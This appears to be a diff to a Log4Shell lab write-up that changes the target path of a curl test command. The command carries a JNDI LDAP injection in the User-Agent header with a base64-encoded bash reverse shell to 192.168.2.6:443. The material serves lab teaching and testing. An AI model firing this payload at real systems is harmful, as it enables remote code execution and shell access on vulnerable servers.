@@ -62,7 +62,7 @@ Mapping ldap://192.168.2.6:1389/o=reference to artsploit.controllers.RemoteRefer
 ## Test JNDI Lookup - Bash B64 Encoded Command
 
 ```bash
-curl -X GET -H 'user-agent: ${jndi:ldap://192.168.2.6:1389/o=tomcat,bashb64cmd=YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjIuNi80NDMgMD4mMQ%3D%3D}' 127.0.0.1:8080/VulnWebApp-1.0-SNAPSHOT/api/threadcontext
+curl -X GET -H 'user-agent: ${jndi:ldap://192.168.2.6:1389/o=tomcat,bashb64cmd=YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjIuNi80NDMgMD4mMQ%3D%3D}' 127.0.0.1:8080/Log4j-2.14.0-SNAPSHOT/api
 ```
 
 ![](../../resources/images/log4jshell-lab-rogue-jndi-test.png)
